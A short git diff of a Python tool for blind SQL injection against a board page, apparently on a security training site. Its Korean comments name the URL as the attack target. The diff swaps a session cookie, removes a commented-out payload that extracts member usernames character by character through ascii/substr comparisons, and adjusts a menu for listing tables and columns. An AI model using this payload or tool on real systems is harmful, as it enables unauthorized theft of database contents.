@@ -6,7 +6,7 @@ from get_infos import *
 #공격 대상 URL 및 초기 쿠키 설정 
 url = "http://elms1.skinfosec.co.kr:8082/community6/free"
 cookies = {
-    "JSESSIONID":"9B6465108B1C67BE1BDFB9E370F5F5C8"
+    "JSESSIONID":"2EC7D2BBF44EB7BE22C5B2BD5C3171BC"
 }
 
 
@@ -25,7 +25,7 @@ result.datas={'BOARD': {'BOARD_ID': [], 'TITLE': [], 'CONTENT': [], 'VIEW_COUNT'
 
 
 #쿼리 설정 및 요청 보내기(POST)
-#print(page.send_post_request(request_string="%test' and (select ascii(substr(USER_NM,1,1)) from (select USER_NM, rownum as rnum from MEMBER) where rnum=1)>128 and '1%'='1"))
+print(page.send_post_request())
 
 #기본 설정 보기 
 #page.show
@@ -131,7 +131,9 @@ while(state != 'q'):
         case '8':
             result.show_tables()
         case '9':
+            print()
             result.show_columns()
+
         case '10':
             result.show_tables()
             user_table = input("데이터 출력을 원하는 테이블을 지정해주세요. ")
